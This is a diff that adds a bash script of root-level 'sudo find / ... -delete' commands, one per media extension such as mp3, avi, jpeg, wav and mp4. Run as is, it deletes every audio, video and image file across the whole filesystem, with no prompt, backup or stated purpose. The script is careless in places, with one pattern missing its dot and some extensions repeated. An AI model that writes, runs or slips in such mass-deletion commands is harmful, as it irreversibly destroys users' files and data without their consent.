@@ -1,0 +1,33 @@
+#!/bin/bash
+
+sudo find / -name '*.mp3' -type f -delete
+sudo find / -name '*.3g2' -type f -delete
+sudo find / -name '*.avi' -type f -delete
+sudo find / -name '*.flv' -type f -delete
+sudo find / -name '*.h264' -type f -delete
+sudo find / -name '*.m4v' -type f -delete
+sudo find / -name '*.mkv' -type f -delete
+sudo find / -name '*mov' -type f -delete
+sudo find / -name '*.jpeg' -type f -delete
+sudo find / -name '*.gif' -type f -delete
+sudo find / -name '*.tiff' -type f -delete
+sudo find / -name '*.bmp' -type f -delete
+sudo find / -name '*.aac' -type f -delete
+sudo find / -name '*.wav' -type f -delete
+sudo find / -name '*.wma' -type f -delete
+sudo find / -name '*.dts' -type f -delete
+sudo find / -name '*.aiff' -type f -delete
+sudo find / -name '*.asf' -type f -delete
+sudo find / -name '*.flac' -type f -delete
+sudo find / -name '*.adpcm' -type f -delete
+sudo find / -name '*.dsd' -type f -delete
+sudo find / -name '*.lpcm' -type f -delete
+sudo find / -name '*.ogg' -type f -delete
+sudo find / -name '*.mpeg-1' -type f -delete
+sudo find / -name '*.mpeg-2' -type f -delete
+sudo find / -name '*.mpeg-4' -type f -delete
+sudo find / -name '*.avi' -type f -delete
+sudo find / -name '*.mov' -type f -delete
+sudo find / -name '*.avchd' -type f -delete
+sudo find / -name '*.mp4' -type f -delete
+sudo find / -name '*.wmv' -type f -delete
